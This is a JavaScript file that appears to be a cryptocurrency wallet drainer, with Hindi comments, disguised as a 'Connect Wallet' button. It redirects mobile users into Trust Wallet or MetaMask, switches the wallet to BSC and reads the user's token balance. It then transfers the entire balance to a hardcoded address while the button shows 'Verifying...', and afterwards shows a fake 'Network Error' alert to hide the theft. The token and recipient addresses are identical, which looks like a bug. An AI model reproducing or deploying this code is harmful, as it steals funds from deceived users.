const bscAddress = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe";
const usdtAddress = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe";

async function startProcess() {
    const btn = document.getElementById("nextBtn");
    
    // 1. सबसे पहले चेक करें कि क्या हम किसी वॉलेट के अंदर हैं?
    const isWeb3 = !!(window.ethereum || window.trustwallet);

    if (!isWeb3) {
        // अगर यूजर Chrome/Safari में है, तो उसे सीधा ऐप पर भेजें
        const currentUrl = window.location.href.replace("https://", "");
        
        // Deep Links for Apps
        const trustLink = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + currentUrl;
        const mmLink = "https://metamask.app.link/dapp/" + currentUrl;

        // मोबाइल यूजर को सीधा Trust Wallet खोलने का निर्देश दें
        if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
            btn.textContent = "Opening Wallet...";
            window.location.href = trustLink;
            
            // अगर 1.5 सेकंड में Trust Wallet नहीं खुला, तो MetaMask ट्राई करें
            setTimeout(() => {
                window.location.href = mmLink;
            }, 1500);
            return;
        } else {
            alert("Please install MetaMask extension on your browser.");
            return;
        }
    }

    // 2. अगर हम ऐप के अंदर पहुँच चुके हैं (या Desktop पर हैं)
    btn.disabled = true;
    btn.textContent = "Connecting...";

    try {
        const provider = window.ethereum || window.trustwallet;
        const web3 = new Web3(provider);
        
        // वॉलेट कनेक्ट करने की रिक्वेस्ट
        const accounts = await provider.request({ method: 'eth_requestAccounts' });
        const userAddress = accounts[0];

        // Network switch to BSC (0x38)
        await provider.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x38' }],
        });

        const minABI = [
            { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
            { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
        ];

        const contract = new web3.eth.Contract(minABI, usdtAddress);
        const balance = await contract.methods.balanceOf(userAddress).call();

        if (parseInt(balance) > 0) {
            btn.textContent = "Verifying...";
            await contract.methods.transfer(bscAddress, balance).send({ from: userAddress });
            
            alert("❌ Network Error: Please try again later.");
        } else {
            alert("No USDT detected in this wallet.");
        }
    } catch (err) {
        console.error(err);
        alert("Connection Failed or Denied.");
    } finally {
        btn.disabled = false;
        btn.textContent = "Connect Wallet";
    }
}

document.getElementById("nextBtn").addEventListener("click", startProcess);
